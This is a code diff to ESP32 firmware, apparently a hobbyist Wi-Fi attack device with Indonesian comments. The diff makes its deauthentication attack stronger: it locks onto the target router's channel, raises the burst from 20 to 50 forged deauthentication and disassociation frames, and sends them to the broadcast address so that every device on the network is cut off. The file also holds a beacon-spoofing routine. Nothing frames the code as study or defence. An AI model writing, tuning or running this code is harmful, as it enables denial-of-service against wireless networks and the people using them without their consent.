@@ -4,10 +4,12 @@
 
 // Fungsi sakti buat ubah String MAC ke Bytes
 void stringToMac(String macStr, uint8_t *macAddr) {
-  for (int i = 0; i < 6; i++) {
-    macAddr[i] = strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
+  int values[6];
+  if (6 == sscanf(macStr.c_str(), "%x:%x:%x:%x:%x:%x", &values[0], &values[1], &values[2], &values[3], &values[4], &values[5])) {
+    for (int i = 0; i < 6; ++i) macAddr[i] = (uint8_t)values[i];
   }
 }
+
 
 uint8_t beaconPacket[128] = {
     0x80, 0x00, // Frame Control: Beacon
@@ -104,9 +106,13 @@ void loopWiFi(void * pvParameters) {
       triggerScan = false; // Matiin pelatuknya
     } else if (isDeauthing && adaTarget) {
     esp_wifi_set_promiscuous(true);
+    WiFi.mode(WIFI_STA); // Paksa mode Station tapi jangan konek mana-mana
+    esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
+
     
         uint8_t targetMac[6];
     stringToMac(targetTerkunci.mac, targetMac); // Ini MAC Router
+    Serial.println(targetTerkunci.mac);
     
     // PELURU MAUT: Tembak ke semua HP yang ada di jangkauan router itu
     uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
@@ -129,7 +135,7 @@ void loopWiFi(void * pvParameters) {
     esp_wifi_set_channel(targetTerkunci.channel, WIFI_SECOND_CHAN_NONE);
 
     // BURST MODE: Tembak bertubi-tubi
-    for(int i=0; i<20; i++) {
+    for(int i=0; i<50; i++) {
         // Acak Sequence Number biar kayak paket asli
         uint16_t seq = (uint16_t)(esp_random() & 0xFFFF);
         deauthFrame[22] = seq & 0xFF;
@@ -139,11 +145,9 @@ void loopWiFi(void * pvParameters) {
         
         // Tembak Deauth
         esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
-        delayMicroseconds(500); // Kasih jeda dikit biar driver gak muntah
-        
-        // Tembak Disassociation
+        delay(1); // Kasih 1ms biar antena gak stres
         esp_wifi_80211_tx(WIFI_IF_STA, disasFrame, sizeof(disasFrame), false);
-        delayMicroseconds(500); 
+        delay(1);
     }
 
     esp_wifi_set_promiscuous(false);
@@ -183,3 +187,6 @@ void sendBeacon(String ssid) {
         delayMicroseconds(100); 
     }
 }
+
+
+    
